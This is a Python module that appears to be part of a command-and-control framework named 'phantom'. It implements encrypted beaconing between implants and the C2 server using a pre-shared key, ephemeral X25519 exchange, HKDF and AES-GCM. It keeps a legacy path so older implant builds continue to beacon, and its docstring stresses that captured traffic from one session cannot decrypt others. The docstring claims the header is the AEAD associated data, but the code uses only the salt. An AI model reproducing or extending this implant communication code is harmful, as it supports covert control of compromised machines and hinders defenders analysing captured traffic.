"""Beacon sealing.

Two layers on purpose:

* the PSK authenticates both ends and is never used as a wire key,
* every implant process invents an ephemeral X25519 key at start-up, puts the
  public half in the ``X-P`` header (``pub.salt``, base64url) and the C2 derives
  the same per-session key. A capture of one session therefore does not open
  another one, and the static key baked into a build is not the traffic key.

The header is also the AEAD additional data, so a header cannot be swapped
between sessions. Clients that send no header still work through the legacy v2
path (PSK + fixed AAD) - old builds keep beaconing after an upgrade.
"""

import base64
import os
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric.x25519 import (X25519PrivateKey,
                                                              X25519PublicKey)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

AAD_V2 = b"phantom-v2"
INFO = b"phantom-v3"
SALT_LEN = 16
HEADER = "x-p"


def _b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _unb64(text: str) -> bytes:
    pad = "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(text + pad)


def derive(psk: bytes, shared: bytes, salt: bytes) -> bytes:
    """HKDF-SHA256 over (PSK || X25519 shared secret)."""
    return HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
                info=INFO).derive(psk + shared)


class ServerKey:
    """Long-lived X25519 identity of the C2, persisted next to the PSK."""

    def __init__(self, path: Path):
        self.path = Path(path)
        self.psk = b""
        if self.path.exists():
            raw = self.path.read_bytes()
        else:
            raw = X25519PrivateKey.generate().private_bytes(
                serialization.Encoding.Raw, serialization.PrivateFormat.Raw,
                serialization.NoEncryption())
            self.path.parent.mkdir(parents=True, exist_ok=True)
            self.path.write_bytes(raw)
            try:
                os.chmod(self.path, 0o600)
            except OSError:
                pass
        self._priv = X25519PrivateKey.from_private_bytes(raw)
        self.pub = self._priv.public_key().public_bytes(
            serialization.Encoding.Raw, serialization.PublicFormat.Raw)

    def pub_hex(self) -> str:
        return self.pub.hex()

    def session_key(self, header: str):
        """Parse ``pub.salt`` and return ``(key, salt)`` or ``None``."""
        try:
            pub_b64, salt_b64 = header.split(".", 1)
            peer = X25519PublicKey.from_public_bytes(_unb64(pub_b64))
            salt = _unb64(salt_b64)
        except Exception:
            return None
        if len(salt) != SALT_LEN:
            return None
        shared = self._priv.exchange(peer)
        return derive(self.psk, shared, salt), salt


class Box:
    def __init__(self, key: bytes, server_key: ServerKey | None = None):
        if len(key) != 32:
            raise ValueError("PSK must be 32 bytes")
        self.psk = key
        self._aes = AESGCM(key)
        self._srv = server_key
        if server_key is not None:
            server_key.psk = key

    # -- legacy v2 ---------------------------------------------------
    def seal(self, plaintext: bytes) -> bytes:
        nonce = os.urandom(12)
        return nonce + self._aes.encrypt(nonce, plaintext, AAD_V2)

    def open(self, blob: bytes) -> bytes:
        return self._aes.decrypt(blob[:12], blob[12:], AAD_V2)

    # -- v3: per session keys ----------------------------------------
    def _key(self, header: str):
        got = self._srv.session_key(header) if self._srv else None
        if got is None:
            raise ValueError("bad session header")
        return got

    def open_v3(self, blob: bytes, header: str) -> bytes:
        key, salt = self._key(header)
        return AESGCM(key).decrypt(blob[:12], blob[12:], salt)

    def seal_v3(self, plaintext: bytes, header: str) -> bytes:
        key, salt = self._key(header)
        nonce = os.urandom(12)
        return nonce + AESGCM(key).encrypt(nonce, plaintext, salt)

    def open_any(self, blob: bytes, header: str = "") -> bytes:
        """v3 when the client sent a header, legacy v2 otherwise."""
        return self.open_v3(blob, header) if header else self.open(blob)

    def seal_any(self, plaintext: bytes, header: str = "") -> bytes:
        return self.seal_v3(plaintext, header) if header else self.seal(plaintext)